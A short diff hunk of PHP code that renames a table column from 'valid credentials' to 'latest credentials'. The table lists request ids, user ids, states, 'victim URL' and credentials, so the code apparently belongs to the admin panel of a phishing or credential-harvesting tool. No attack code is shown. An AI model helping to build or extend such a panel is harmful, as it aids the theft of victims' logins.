@@ -230,7 +230,7 @@ if(!file_exists($path)) {
 
 	if(!empty($data)) {
 		echo "<table>" . PHP_EOL;
-		echo "<tr><th>#</th><th>request id</th><th>user id</th><th>state</th><th>blocked</th><th>victim URL</th><th>valid credentials</th></tr>" . PHP_EOL;
+		echo "<tr><th>#</th><th>request id</th><th>user id</th><th>state</th><th>blocked</th><th>victim URL</th><th>latest credentials</th></tr>" . PHP_EOL;
 		$cnt = 0;
 
 		$domain = substr($_SERVER["HTTP_HOST"], 0, strpos($_SERVER["HTTP_HOST"], ":"));
